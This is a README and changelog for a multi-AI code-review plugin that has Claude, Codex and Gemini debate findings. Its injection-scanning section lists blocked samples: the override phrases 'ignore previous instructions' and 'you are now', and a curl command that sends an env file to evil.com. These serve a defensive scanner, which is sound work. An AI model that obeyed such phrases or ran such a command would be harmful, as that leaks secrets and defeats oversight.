<p align="center">
  <h1 align="center">AI Review Arena</h1>
  <p align="center">
    <strong>Make AI models argue with each other before your code ships.</strong>
  </p>
  <p align="center">
    <a href="README.md">English</a> | <a href="README.ko.md">한국어</a>
  </p>
</p>

---

## The Idea

You ask one AI to review your code. It finds 12 issues. But which ones are real?

**Arena's answer: make three AIs fight about it.**

```
┌──────────────────────────────────────────────────────────┐
│                    SINGLE AI REVIEW                       │
│                                                           │
│   You  ───►  One AI  ───►  "12 issues found"             │
│                                                           │
│   But... which are real? You have to check all 12.        │
└──────────────────────────────────────────────────────────┘

                        vs.

┌──────────────────────────────────────────────────────────┐
│                    ARENA REVIEW                           │
│                                                           │
│   You  ───►  Claude  ───┐                                │
│              Codex   ───┼──►  They argue  ───►  5 real   │
│              Gemini  ───┘    with each other    issues    │
│                                                           │
│   3 AIs independently review, then cross-examine          │
│   each other's findings. Fake issues get eliminated.      │
│   Real issues get confirmed with higher confidence.       │
└──────────────────────────────────────────────────────────┘
```

---

## How The Fight Works

Three AI families review your code separately, then challenge each other in 3 rounds:

```
 ROUND 1                    ROUND 2                    ROUND 3
 Independent Review         Cross-Examination           Defense
 ──────────────────         ─────────────────           ───────

 Claude: "I found           Codex: "Claude's            Claude: "No, look
  a SQL injection            finding #3 is a             at line 42 — user
  at line 42"                false positive,             input goes directly
                             this input is               into the query
 Codex: "I found             already sanitized"          without escaping.
  a race condition                                       Here's proof..."
  at line 89"               Gemini: "Actually,
                             I agree with                   ───►  CONFIRMED
 Gemini: "I found            Claude — the                        confidence: 92%
  unused imports             sanitization
  at line 7"                 misses Unicode"                ───►  DISMISSED
                                                                 (false positive)
```

**What survives this fight = what you should actually fix.**

---

## But Wait — It Does Way More Than Code Review

Arena isn't just a reviewer. It's a **full lifecycle system** that handles everything from "I have an idea" to "ship it."

```
    "Build an OAuth login"
              │
              ▼
    ┌─────────────────────────────────┐
    │       ARENA PIPELINE            │
    │                                 │
    │  1. Analyze your codebase       │  ← learns your coding style
    │  2. Research best practices     │  ← searches the web
    │  3. Check compliance rules      │  ← platform guidelines
    │  4. Debate implementation       │  ← AIs argue about HOW to build it
    │  5. Build it                    │
    │  6. Review with 3 AI teams      │  ← the fight described above
    │  7. Auto-fix safe issues        │  ← fixes trivial things automatically
    │  8. Generate tests              │  ← writes regression tests
    │  9. Final report                │  ← pass/fail verification
    │                                 │
    └─────────────────────────────────┘
```

And it works for **three domains**, not just code:

| | Code | Business | Documentation |
|---|---|---|---|
| **Routes** | A-F | G-I | J-K |
| **Example** | "Build OAuth" | "Write pitch deck" | "Review API docs" |
| **Reviewers** | 12 specialized agents | 10 specialized agents | 6 specialized agents |
| **Special** | Threat modeling, static analysis | Red team, quant validation | Code-doc drift detection |

---

## It Turns On Automatically

You don't call Arena. **Arena calls itself.**

Every request you make to Claude Code gets routed through Arena automatically:

```
You say:                          Arena does:
─────────────────────────────     ─────────────────────────────
"Build a login page"          →   Route A: Full lifecycle
"Fix this typo"               →   Route F: Quick fix (instant)
"Review this PR"              →   Route D: Multi-AI review
"Write a pitch deck"          →   Route G: Business pipeline
"Are the docs accurate?"      →   Route J: Doc review pipeline
"Refactor this module"        →   Route E: Refactoring pipeline
"Research auth best practices"→   Route B: Deep research
```

Simple stuff gets done in seconds. Complex stuff activates the full pipeline with debates.

---

## How Intensity Works

Arena decides how hard to think using a **4-agent debate**:

```
                    "Implement payment processing"
                               │
                 ┌─────────────┼─────────────┐
                 │             │             │
                 ▼             ▼             ▼
          ┌───────────┐ ┌───────────┐ ┌───────────┐
          │ "This is  │ │ "Standard │ │ "Payment = │
          │  complex, │ │  is fine, │ │  HIGH risk, │
          │  needs    │ │  it's a   │ │  data loss  │
          │  deep     │ │  known    │ │  possible"  │
          │  review"  │ │  pattern" │ │             │
          └─────┬─────┘ └─────┬─────┘ └─────┬─────┘
          Intensity     Efficiency     Risk
          Advocate      Advocate       Assessor
                 │             │             │
                 └─────────────┼─────────────┘
                               ▼
                    ┌─────────────────┐
                    │   Arbitrator:   │
                    │  "DEEP — this   │
                    │   touches money"│
                    └─────────────────┘
```

| Level | When | What Happens |
|-------|------|-------------|
| **Quick** | Typos, renames, explanations | Claude fixes it solo, no debate |
| **Standard** | Normal features, single-file | Full review + debate + auto-fix |
| **Deep** | Multi-file, auth, APIs | + Research + compliance + threat modeling |
| **Comprehensive** | Architecture, payment, security | + Benchmarking + full agent roster |

---

## The Phase Map

Here's every phase in the code pipeline, and when it runs:

```
                    quick    standard    deep    comprehensive
                    ─────    ────────    ────    ─────────────
Phase 0   Config     ●          ●        ●           ●
Phase 0.1 Intensity  ●          ●        ●           ●
Phase 0.2 Cost Est            ●        ●           ●
Phase 0.5 Codebase   ●          ●        ●           ●
Phase 1   Stack               ●        ●           ●
Phase 2   Research                      ●           ●
Phase 3   Compliance                    ●           ●
Phase 4   Benchmark                                 ●
Phase 5   Figma               ●        ●           ●
Phase 5.5  Strategy            ●        ●           ●
Phase 5.5.5 Spec Gate          ●        ●           ●
Phase 5.8 Static Analysis      ●        ●           ●
Phase 5.9 Threat Model                  ●           ●
Phase 5.95 Review Contract      ●        ●           ●  ← NEW
Phase 6   Team Review          ●        ●           ●
Phase 6.5 Auto-Fix (+eval)     ●        ●           ●  ← IMPROVED
Phase 6.6 Test Gen            ●        ●           ●
Phase 6.7 Visual Verify        ●        ●           ●
Phase 7   Report     ●          ●        ●           ●

"Quick" = Claude solo. No team, no debate. Instant.
"Standard+" = Full Agent Team with 3-round cross-examination.
```

---

## The Review Team (Phase 6 Detail)

This is where the magic happens. Here's exactly how the multi-AI review works:

```
┌──────────────────────────────────────────────────────────────────────┐
│                                                                      │
│  STEP 1: Spawn debate-arbitrator first (Early Join)                  │
│  ═══════════════════════════════════════════════════                  │
│  It monitors everything from the start.                              │
│                                                                      │
│  STEP 2: Spawn 6-12 Claude reviewers simultaneously                  │
│  ══════════════════════════════════════════════════                   │
│                                                                      │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐               │
│  │ Security │ │   Bug    │ │  Perf    │ │  Arch    │  ... more      │
│  │ Reviewer │ │ Detector │ │ Reviewer │ │ Reviewer │  reviewers     │
│  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────┬─────┘               │
│       │             │             │             │                     │
│       │    ┌────────┼─────────────┼─────────────┘                    │
│       │    │  They share SIGNALS in real-time:                       │
│       │    │                                                         │
│       │    │  Security→Bug: "Auth bypass at line 45,                │
│       │    │                 check for race conditions"              │
│       │    │  Perf→Security: "Unbounded query at line 89,           │
│       │    │                  possible DoS vector"                   │
│       │    └─────────────────────────────────────────                │
│       │                                                              │
│       └──────────► debate-arbitrator tracks all signals              │
│                    de-duplicates, finds cross-domain patterns        │
│                                                                      │
│  STEP 3: Run Codex & Gemini CLI in parallel                          │
│  ══════════════════════════════════════════                           │
│  External models review independently via shell scripts              │
│                                                                      │
│  STEP 4: Aggregate → 3-Round Cross-Examination → Consensus          │
│  ════════════════════════════════════════════════════════             │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

### Agent Roster

**Code Review (12 agents)**

| Agent | What It Looks For |
|-------|-------------------|
| security-reviewer | SQL injection, XSS, auth flaws, OWASP Top 10 |
| bug-detector | Logic errors, null pointers, race conditions |
| architecture-reviewer | SOLID violations, bad coupling, design smells |
| performance-reviewer | O(n^2) loops, memory leaks, N+1 queries |
| test-coverage-reviewer | Missing tests, untested edge cases |
| scope-reviewer | Drive-by refactors, unrelated changes |
| dependency-reviewer | Risky/outdated dependencies |
| api-contract-reviewer | Breaking API changes |
| observability-reviewer | Missing logs, metrics, traces |
| data-integrity-reviewer | Data validation gaps |
| accessibility-reviewer | A11y compliance |
| configuration-reviewer | Hardcoded configs, env issues |

**Business Review (10 agents)** — for pitch decks, proposals, marketing

| Agent | What It Looks For |
|-------|-------------------|
| accuracy-evidence-reviewer | Wrong numbers, unsupported claims |
| audience-fit-reviewer | Wrong tone for target audience |
| competitive-positioning-reviewer | Weak market positioning |
| financial-credibility-reviewer | Unrealistic projections |
| legal-compliance-reviewer | Regulatory issues |
| + 5 more | market-fit, conversion, localization, narrative, investor-readiness |

**Documentation Review (6 agents)** — for README, API docs, tutorials

| Agent | What It Looks For |
|-------|-------------------|
| doc-accuracy-reviewer | Code says X, docs say Y |
| doc-completeness-reviewer | Missing sections |
| doc-freshness-reviewer | Outdated content |
| doc-readability-reviewer | Confusing writing |
| doc-example-reviewer | Broken code examples |
| doc-consistency-reviewer | Contradictions across docs |

---

## Safety Systems

### High-Risk Pattern Detection

Arena automatically detects dangerous file patterns and escalates:

```
You edit auth/login.ts
         │
         ▼
  ┌──────────────────┐
  │ Escalation Scan   │   Matches: auth_security pattern
  │ (0 LLM cost,     │
  │  pure grep)       │
  └────────┬─────────┘
           │
  ┌────────▼─────────┐
  │ ● Intensity → deep (minimum)
  │ ● Auto-fix BLOCKED for this file
  │ ● Human approval may be required
  └──────────────────┘

Patterns: auth, payment, crypto, DB schema, dependencies, infrastructure
```

### Write Scope

Auto-fix can only touch files within the task scope:

```
Task: "Fix bug in utils/dates.ts"

  ✅ Can auto-fix: utils/dates.ts, tests/dates.test.ts
  ❌ Cannot auto-fix: src/auth/login.ts (out of scope → asks you first)
```

### Verification Contract

The final report isn't just "here are issues." It's a **pass/fail verification**:

```
┌─────────────────────────────────────────┐
│         VERIFICATION CONTRACT            │
├───────────────────────┬────────┬────────┤
│ Layer                 │ Status │ Issues │
├───────────────────────┼────────┼────────┤
│ Coding Guidelines     │  PASS  │ 0      │
│ Organization Rules    │  PASS  │ 0      │
│ Domain Contracts      │  WARN  │ 2      │
│ Acceptance Criteria   │  PASS  │ 0      │
│ Static Analysis       │  PASS  │ 0      │
│ Debate Consensus      │  FAIL  │ 1      │
├───────────────────────┼────────┼────────┤
│ Overall               │  FAIL  │        │
└───────────────────────┴────────┴────────┘
```

---

## Design Philosophy

### Why AI vs AI?

Single-model reviews have blind spots. Every AI has different training data, different biases, different strengths. By making them **argue**, you get:

1. **False positives eliminated** — if only one AI sees it and can't defend it, it's probably wrong
2. **Real issues confirmed** — if multiple AIs independently find it, it's probably real
3. **Confidence you can trust** — post-debate confidence reflects actual cross-validation

### Why Agents That Talk To Each Other?

Traditional approach: each reviewer works alone, results get merged.

Arena approach: reviewers **share signals in real-time**:

```
Traditional:                    Arena:
─────────────                   ──────

Security: finds auth issue      Security: finds auth issue
Bug: misses it                     │
Perf: misses it                    ├──SIGNAL──► Bug: "check race
                                   │            conditions here too"
                                   │
                                   └──SIGNAL──► Perf: "unbounded
                                                query, DoS risk?"

Result: 1 finding               Result: 3 findings from one signal
```

### Why Debates, Not Just Voting?

Voting: "2 out of 3 AIs say yes" → but what if 2 are wrong the same way?

Debate: "AI #2, you said this is safe. AI #1 says it's not. Defend your position." → forces reasoning, not just pattern matching.

---

## v3.4.0 — Self-Improving Review Pipeline

### Gotchas: Domain-Specific False Positive Filters

Every agent now has a `## Gotchas` section — patterns that *look* like issues but aren't:

```
Security Reviewer Gotchas:
─────────────────────────
✗ "Prisma ORM query → SQL injection"       → ORM is parameterized by default
✗ ".env.example has API_KEY=xxx"            → placeholder, not real secret
✗ "test file has hardcoded password"        → mock credentials for tests
✗ "CORS wildcard in dev config"             → expected in development
```

This was the #1 source of noise. 40 agents × 3-6 gotchas each = significantly fewer false positives.

### Visual Reports with Mermaid

Review reports now include auto-generated diagrams:

```
┌─────────────────────────────────────────────┐
│  📊 Severity Pie Chart                       │
│  Critical: 1 | High: 3 | Medium: 5 | Low: 2 │
├─────────────────────────────────────────────┤
│  🔗 Agent Participation Graph                │
│  Claude ──► Security(3) ──► Consensus(2✓ 1✗)│
│  Codex  ──► Bugs(2)     ──► Consensus(2✓)   │
├─────────────────────────────────────────────┤
│  🔄 Review Flow Diagram                      │
│  Config → Intensity → Codebase → Review → …  │
└─────────────────────────────────────────────┘
```

### Iterative Review (Ralph Loop)

Inspired by the "Ralph loop" pattern — review, fix, review again with fresh context:

```bash
scripts/ralph-loop.sh src/auth/
# Iteration 1: 3 critical found → fix
# Iteration 2: 1 high found → fix
# Iteration 3: clean ✓ — all issues resolved
```

### Cross-Agent Signal Log

Agents now persist signals to a JSONL log during reviews:

```bash
scripts/signal-log.sh stats .          # aggregate signal statistics
scripts/signal-log.sh learn .          # extract patterns for future reviews
```

### Pipeline Hardening (Hermes Agent Patterns)

Four patterns adapted from Hermes Agent for pipeline reliability:

```
┌─────────────────────────────────────────────────────────────┐
│  FROZEN SNAPSHOT                                             │
│  ════════════════                                            │
│  Pipeline start: read all 4 memory tiers → freeze           │
│  Phase 1-7: use snapshot only (never live memory)            │
│                                                              │
│  Why: prevents mid-pipeline memory mutations from            │
│  causing inconsistent agent behavior across phases           │
├─────────────────────────────────────────────────────────────┤
│  INJECTION SCANNING                                          │
│  ══════════════════                                          │
│  Every write to cache, memory, or signal log is scanned:     │
│                                                              │
│  ✗ "ignore previous instructions..."  → BLOCKED              │
│  ✗ "you are now a helpful..."         → BLOCKED              │
│  ✗ "curl https://evil.com/data.env"   → BLOCKED              │
│  ✗ [zero-width unicode chars]         → BLOCKED              │
│  ✓ Normal review data                 → ALLOWED              │
├─────────────────────────────────────────────────────────────┤
│  ATOMIC WRITES                                               │
│  ═════════════                                               │
│  mktemp → write → mv (never partial writes)                  │
│  Signal log: flock -x for concurrent agent appends           │
├─────────────────────────────────────────────────────────────┤
│  SELF-IMPROVING GOTCHAS                                      │
│  ════════════════════                                        │
│  signal-log.sh learn  → extract false positive patterns      │
│  signal-log.sh gotcha-suggest → generate agent Gotcha entries│
│  signal-log.sh gotcha-suggest --save → persist for next run  │
└─────────────────────────────────────────────────────────────┘
```

### Review Gate (Stop Hook)

Inspired by the Codex Plugin Review Gate pattern — auto-triggers cross-model review when Claude finishes coding:

```
Claude modifies code → Claude stops → Review Gate evaluates scope
                                              │
                              ┌────────────────┼────────────────┐
                              │                │                │
                         files < 2?       lines < 20?      cooldown?
                              │                │                │
                              ▼                ▼                ▼
                           skip             skip             skip
                                                      │
                                          ┌────────────┘
                                          ▼
                               ┌─────────────────────┐
                               │  Cross-Model Review  │
                               │  Codex + Gemini      │
                               │  security + bugs     │
                               └──────────┬──────────┘
                                          │
                               ┌──────────┼──────────┐
                               │                     │
                          CRITICAL found?       LGTM
                               │                     │
                          BLOCK Claude          Continue
                          "Fix before stopping"
```

Enable in config: `"review_gate": { "enabled": true }`

### Batch Worktree Review

Git worktree-based parallel execution for fleet/swarm mode — each review target gets an isolated worktree:

```
Fleet Mode (same role × multiple files):
┌──────────────────────────────────────────────┐
│  worktree/fleet-0/  ←  security review file1 │
│  worktree/fleet-1/  ←  security review file2 │
│  worktree/fleet-2/  ←  security review file3 │
│                                               │
│  All isolated. No cross-contamination.        │
│  Falls back to subprocess if no git.          │
└──────────────────────────────────────────────┘

Swarm Mode (multiple roles × same file):
┌──────────────────────────────────────────────┐
│  worktree/swarm-security/  ←  security review│
│  worktree/swarm-bugs/      ←  bug detection  │
│  worktree/swarm-perf/      ←  perf review    │
│                                               │
│  Signal sharing between agents for            │
│  convergence via debate-arbitrator.           │
└──────────────────────────────────────────────┘
```

### More in v3.4.0

| Feature | Description |
|---------|-------------|
| **Review Gate** | Stop hook auto-triggers cross-model review when change scope exceeds threshold |
| **Batch Worktree** | Git worktree-based parallel fleet/swarm with signal sharing and subprocess fallback |
| **`--bare` CLI** | Non-interactive Claude CLI calls use `--bare` for up to 10x faster startup |
| **Session Handover** | Auto-saves state when context window fills, resumes in new session |
| **FTS5 Search** | BM25-ranked full-text search across cache, memory, and signal logs |
| **Knowledge Graph** | JSONL triple store tracking finding relationships over time |
| **Fleet/Swarm Mode** | Fleet = same review × multiple targets; Swarm = parallel aspect review |
| **Phase Contracts** | YAML definitions of inputs/outputs between pipeline phases |
| **Feedback → Gotchas** | `feedback-tracker.sh improve` generates gotcha suggestions from false positive patterns |
| **Review Daemon** | Background queue for async PR reviews |

---

## Quick Start

### Install

```bash
# Option 1: Claude Code plugin
claude plugin add HajinJ/ai-review-arena

# Option 2: From source
git clone https://github.com/HajinJ/ai-review-arena.git
cd ai-review-arena
bash scripts/setup-arena.sh
```

### Prerequisites

| Tool | Required? | What For |
|------|-----------|----------|
| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | Yes | Runs everything |
| [jq](https://jqlang.github.io/jq/) | Yes | JSON processing |
| [Codex CLI](https://github.com/openai/codex) | Optional | Second AI perspective |
| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | Optional | Third AI perspective |

Without Codex/Gemini, Arena still works — it runs Claude-only multi-agent review with the same debate protocol.

### Configure

```bash
# Project-specific config (optional)
cat > .ai-review-arena.json << 'EOF'
{
  "review": {
    "intensity": "standard",
    "focus_areas": ["security", "performance"]
  },
  "output": {
    "language": "en"
  }
}
EOF
```

### Use It

Just use Claude Code normally. Arena activates automatically.

```
You: "Add rate limiting to the API"
     → Arena routes to: Feature Implementation (Route A)
     → Intensity debate: "standard" (API change, moderate risk)
     → Full pipeline executes
     → 3-round review with cross-examination
     → Report with pass/fail verification
```

To skip Arena: add `--no-arena` to your request.

---

## Fallback Framework

Arena degrades gracefully when tools are missing:

```
Level 0: Claude + Codex + Gemini (full power)
  │ Codex unavailable
Level 1: Claude + Gemini
  │ Gemini also unavailable
Level 2: Claude-only Agent Team (all roles)
  │ Agent Teams unavailable
Level 3: Claude solo with structured template
  │ jq unavailable
Level 4: Claude solo with manual JSON
  │ Critical failure
Level 5: Error report with partial findings
```

---

## Project Structure

```
ai-review-arena/
├── .codex/           Codex subagent config (5 custom agents with per-agent model)
├── agents/           41 agent definitions (12 code + 10 biz + 6 doc + 13 utility)
├── commands/         8 slash commands (arena, multi-review, research, stack, ...)
├── config/           Config files, prompts, schemas, benchmarks, phase contracts
├── scripts/          48 shell scripts (orchestration, CLI adapters, utilities)
├── shared-phases/    14 reusable phase definitions
├── hooks/            Auto-review triggers (PostToolUse + Stop Review Gate)
├── tests/            18 tests (unit + integration + e2e)
└── docs/             ADRs and reference docs
```

---

## Benchmark Results

Pipeline evaluation results using ground-truth test cases with planted vulnerabilities. Compares Solo (single model) vs Arena (multi-AI with cross-examination).

### Solo vs Arena Comparison

| Category | Solo Codex F1 | Solo Gemini F1 | Arena F1 | Arena Wins? |
|----------|---------------|----------------|----------|-------------|
| Security | 0.500 - 0.667 | 0.400 - 0.600 | 0.700 - 0.857 | Yes |
| Bugs | 0.600 - 0.750 | 0.500 - 0.667 | 0.800 - 1.000 | Yes |
| Architecture | 0.667 - 0.800 | 0.500 - 0.750 | 0.857 - 1.000 | Yes |
| Performance | 0.500 - 0.667 | 0.400 - 0.600 | 0.750 - 0.923 | Yes |

F1 ranges reflect variance across multiple runs due to LLM non-determinism.

### Why Arena beats Solo

Cross-examination catches errors that individual models miss. When Codex flags a "critical SQL injection" but Claude and Gemini both point to parameterized queries, the false positive is filtered out. When all three independently find the same race condition, confidence increases. The 3-round debate (review → challenge → defend/concede) acts as a filter that improves both precision and recall over any single model.

### Methodology

Benchmark test cases contain **planted vulnerabilities** in synthetic code (SQL injection, race conditions, etc.), each with a `ground_truth` listing expected keywords. Scoring uses keyword matching: a finding counts as a true positive if it mentions at least one expected keyword in a positive (non-negated) context. F1 = 2 * precision * recall / (precision + recall). This approach has inherent limitations — keyword matching cannot capture the nuance of whether a model truly "understood" the vulnerability vs. merely mentioned related terms.

### Caveats

- Benchmarks use **planted vulnerabilities** in synthetic code. Real-world detection rates will differ.
- Results vary between runs. The ranges above represent typical outcomes, not guarantees.
- Arena requires 2-3x the API cost of a solo review. The trade-off is higher accuracy.
- Test cases are limited (8 code benchmarks). More diverse benchmarks are needed to generalize.
- Keyword matching can both over-count (incidental mentions) and under-count (paraphrased findings).

Run `./scripts/run-solo-benchmark.sh --verbose` to see a full Solo vs Arena comparison.
Run `./scripts/run-benchmark.sh --verbose` to see Arena-only results.

---

## Platform Support

| Platform | Status | Notes |
|----------|--------|-------|
| macOS | Full support | |
| Linux | Full support | |
| Windows (WSL) | Full support | |
| Windows (Git Bash) | Partial | Core features work, some scripts may need WSL |
| Windows (Native) | Commands only | Scripts require WSL (`wsl --install`) |

---

## Changelog

### v3.5.0 — Harness Design Improvements

Six improvements derived from Anthropic's "Harness Design for Long-Running Apps" blog. Core insights: Generator-Evaluator separation, proactive context reset, model-capability-based harness tuning.

- **Weighted Evaluation Rubric**: Project-type-specific category weights for review prioritization. Presets for fintech (security 3x), gaming (performance 3x), healthcare (security 2.5x, bugs 2x), startup MVP. Default weights are all 1.0 (no behavior change). Medium findings in high-weight categories get "elevated" marking. Config: `review.evaluation_weights`
- **Evaluator Skepticism Tuning**: 4-level review strictness presets (lenient/balanced/strict/adversarial) controlling challenge threshold, unique finding acceptance score, defense penalty multiplier, and consensus threshold. Applied to all 3 debate arbitrators (code, business, doc). Default "balanced" matches existing hardcoded values. Config: `debate.skepticism`
- **Proactive Context Reset**: Phase-boundary context resets at Phase 5.9→6 (pre-review) and Phase 6.7→7 (pre-report) when context utilization exceeds threshold. Ensures reviewers and report generator operate with fresh context. Complements existing reactive handover (>60% utilization). Config: `arena.context_reset`
- **Auto-Fix Evaluator Loop** (Generator-Evaluator separation): Replaces batch-apply-then-test with per-fix verification. Each fix is individually applied → tested → evaluated by independent `fix-verification-evaluator` agent → failed fixes revert individually (not all). Up to 3 retry attempts with evaluator's suggested revisions. New agent: `agents/fix-verification-evaluator.md`. Config: `arena.autofix_evaluator`
- **Review Contract** (Phase 5.95): Generates a contract defining accepted patterns, severity overrides, focus areas, and known technical debt before Phase 6 review. Auto-detects codebase conventions (naming, error handling, imports). Merges with user overrides from `.ai-review-arena.json`. Distributed to all reviewers to reduce false positives from project-intentional patterns. New shared phase: `shared-phases/review-contract.md`. Config: `arena.review_contract`
- **Capability-Relative Harness**: Model-capability profiles that skip unnecessary phases based on empirical F1 benchmarks. `scripts/harness-stress-test.sh` runs phase ablation studies — disables each phase one-by-one, measures F1 impact, recommends skip candidates. **Disabled by default** (`enabled: false`); requires explicit activation after running stress tests. Config: `model_capability`
- **Review Gate** (`review-gate.sh`): Stop hook handler evaluates uncommitted change scope (files/lines) and auto-triggers cross-model review when thresholds exceeded. Inspired by Codex Plugin Review Gate pattern. `block_on_critical` stops Claude when critical issues found. Cooldown prevents excessive re-triggers. Config: `review_gate`
- **Batch Worktree Review** (`batch-worktree-review.sh`): Git worktree-based parallel execution for fleet/swarm mode. Each review target gets isolated worktree preventing cross-contamination. Swarm mode supports inter-agent signal sharing for convergence. Falls back to subprocess model when worktrees unavailable. Config: `fleet_swarm.batch_worktree`
- **`--bare` CLI optimization**: Non-interactive Claude CLI calls use `--bare` flag for up to 10x startup speed improvement (skips CLAUDE.md, settings, and MCP auto-discovery)
- 41 agents (was 40), 48 scripts (was 39), 14 shared phases (was 13), 7 new config sections

### v3.4.0

- **Gotchas Sections**: All 40 agents now have `## Gotchas` with 3-6 domain-specific false positive patterns each, reducing noise from known-safe patterns (e.g., ORM parameterized queries flagged as SQL injection, test file mock credentials flagged as hardcoded secrets)
- **Mermaid Report Visualization**: `generate-report.sh` outputs severity pie chart, agent participation graph, and review flow diagram as Mermaid blocks — renders in GitHub PR comments and markdown viewers
- **Intensity Rationale**: Reports now explain *why* a specific intensity was chosen (e.g., "deep — auth-related changes detected")
- **JSONL Signal Log** (`signal-log.sh`): Cross-agent signals (finding, challenge, support, escalation, consensus) persisted as append-only JSONL. `learn` command extracts patterns for future reviews
- **Session Handover Protocol** (`shared-phases/session-handover.md`): Auto-saves review state when context window exceeds 60%, generates resume-prompt for seamless continuation in new session
- **Phase Artifact Contracts** (`config/phase-contracts.yaml`): YAML definitions of inputs, outputs, and `consumed_by` relationships for all pipeline phases across code, business, and doc pipelines
- **Feedback Auto-Improvement**: `feedback-tracker.sh improve` analyzes false positive patterns to generate gotcha suggestions; `patterns` extracts best models per category (cognee observe-inspect-amend-evaluate pattern)
- **FTS5 Search with BM25** (`cache-manager.sh search`): SQLite FTS5 full-text search across memory tiers and signal logs with BM25 ranking. Auto-builds index, grep fallback when SQLite unavailable
- **Knowledge Graph** (`cache-manager.sh graph-*`): JSONL triple store for tracking finding relationships, agent performance, and pattern evolution over time
- **Fleet/Swarm Mode**: Fleet = same review across multiple targets (monorepo); Swarm = parallel aspect review with convergence. Configurable via `fleet_swarm` config section
- **Ralph Loop** (`ralph-loop.sh`): Iterative review-fix-review loop with fresh context per iteration, runs until no critical/high findings remain (max 5 iterations)
- **Review Daemon** (`review-daemon.sh`): Async ticket queue for background PR reviews with enqueue/process/status/list commands
- **Review Visualization Templates** (`shared-phases/review-visualization.md`): 4 Mermaid diagram templates (severity pie, review flow, agent participation, intensity mindmap)
- **Frozen Snapshot Pattern** (`pipeline_memory_snapshot()` in utils.sh): Reads all 4 memory tiers once at pipeline start; all subsequent phases use the frozen snapshot, preventing mid-pipeline mutations from causing inconsistent agent behavior
- **Content Injection Scanning** (`validate_cache_content()` in utils.sh): Regex-based validation blocks prompt injection, identity overrides, data exfiltration URLs, and invisible unicode before any cache/memory/signal-log write
- **Atomic File Writes** (`atomic_write()` in utils.sh): mktemp + mv pattern prevents partial-write corruption; signal-log uses flock-based atomic append for concurrent multi-agent safety
- **Self-Improving Gotchas** (`signal-log.sh gotcha-suggest`): Converts false-positive patterns from signal log learnings into agent Gotcha suggestions; `--save` persists to short-term memory for next pipeline run
- 40 agents (each +Gotchas), 39 scripts (was 37), 13 shared phases (was 10), 4 new config sections

### v3.3.0

- **Static Analysis Integration** (Phase 5.8, standard+): Runs external scanners (semgrep, eslint, bandit, gosec, brakeman, cargo-audit) before agent review. Stack-based scanner selection, parallel execution, output normalization to standard format. Findings forwarded as additional context to Phase 6 reviewer agents
- **STRIDE Threat Modeling** (Phase 5.9, deep+): 3-agent adversarial debate — threat-modeler identifies STRIDE threats, threat-defender challenges them as mitigated/unlikely, threat-arbitrator synthesizes into prioritized attack surface list
- **Test Generation** (Phase 6.6, standard+): Generates regression test stubs for critical/high findings with confidence >= 70. Auto-detects test framework (jest, pytest, go test, etc.) and test directory structure
- **Round 4 Escalation** (deep+): When Round 3 leaves unresolved high-severity disputes, a fresh-perspective arbitrator breaks the deadlock with additional evidence requirements
- **Framework Selection Debate** (Phase B1.5, standard+): 3-agent debate selects analysis frameworks before content creation. Built-in database of 16 frameworks across content (AIDA, StoryBrand, PAS), strategy (Porter, SWOT, PESTEL, Blue Ocean), and communication (Pyramid Principle, SPIN) categories
- **Evidence Tiering Protocol**: All 10 business reviewer agents now classify evidence quality into 4 tiers — T1 (1.0 weight, govt/academic), T2 (0.8, industry reports), T3 (0.5, news/blogs), T4 (0.3, AI estimation). Confidence adjusted by tier weight. Critical findings require T2+ evidence
- **3-Scenario Mandate** (Phase B5.5, standard+): Strategy debate output now requires base, optimistic, and pessimistic scenarios with quantitative projections
- **Quantitative Validation** (Phase B5.6, deep+): 2-agent team (data-verifier + methodology-auditor) cross-validates all numerical claims via WebSearch. Claims rated VERIFIED, UNVERIFIED, or CONTRADICTED with deviation percentages
- **Adversarial Red Team** (Phase B5.7, deep+): 3 adversarial agents stress-test business content — skeptical-investor ("why NOT invest?"), competitor-response ("how would competitors counter?"), regulatory-risk ("hidden regulatory risks?"). Agent selection varies by business type
- **Consistency Validation** (Phase B7): Cross-checks numerical consistency, claim consistency across sections, and tone consistency before final report
- **10 new config sections**: static_analysis, threat_modeling, test_generation, debate_escalation, framework_selection, evidence_tiering, scenario_analysis, quantitative_validation, red_team, consistency_validation
- 33 agents (was 27), 32 scripts (was 29), 9 shared phases (was 3)
- **Codex Subagent Migration**: Replaced `config/codex-agents/` with new `.codex/agents/` project-scoped format. 5 custom agents with top-level schema (`name`, `description`, `developer_instructions`, `nickname_candidates`). Per-agent model override (gpt-5.4 high reasoning for security/bugs/architecture, gpt-5.3-codex-spark medium for performance/testing). Display nicknames for parallel agent UI readability. Agent resolution: `.codex/agents/` (project) → `~/.codex/agents/` (user). CSV batch review via `scripts/codex-batch-review.sh` with `spawn_agents_on_csv` support and parallel subprocess fallback. `max_threads` increased from 3 to 6

### v3.2.0

- **Commit/PR Safety Protocol**: Mandatory review gate + user confirmation before `git commit` or `gh pr create`
  - Commits: diff review for secrets, debug code, unintended files → AskUserQuestion confirmation
  - PRs: full Route D code review at standard+ intensity → review findings summary → AskUserQuestion confirmation
- **Phase 0.1-Pre: Quick Intensity Pre-Filter**: Rule-based pre-filter skips 4-agent intensity debate for obvious quick cases (rename, explanation, test execution), saving ~$0.50+ and ~30s per trivial request
- **Core Rule Enforcement**: Explicit exempt/non-exempt lists replace vague "every request" rule — code explanations, commits, debugging all MUST route through pipeline
- **Config 3-Level Deep Merge**: `load_config()` now properly merges default → global → project configs via `jq -s` deep merge (previously only returned first found file)
- **Phase-Based Cost Estimation**: Rewrote `cost-estimator.sh` with per-phase token/cost tables, `--intensity`/`--pipeline`/`--lines`/`--json` params, scales by agent count and input size
- **Shared Phases**: Extracted common phase definitions (`shared-phases/`) for intensity debate, cost estimation, and feedback routing — shared by code and business pipelines
- **Feedback-Based Routing**: `feedback-tracker.sh recommend` computes combined score (60% feedback accuracy + 40% benchmark F1) for model-category role assignment in Phase 6/B6
- **Benchmark Negation Detection**: `keyword_match_positive()` prevents false positives from negated mentions ("no evidence of SQL injection" no longer counts as finding SQL injection)
- **Benchmark Multi-Format Support**: `check_ground_truth()` handles array-of-objects, single-object, and flat-array ground truth formats
- **Cache Session Cleanup**: `cache-manager.sh cleanup-sessions` removes stale `/tmp/ai-review-arena*` directories and merged config temp files
- **Hash Collision Resistance**: `project_hash()` extended from 48-bit (12 chars) to 80-bit (20 chars)
- **i18n Cleanup**: All prompts, examples, and metadata in routing/command files converted to English; Korean retained only in intentional i18n output templates
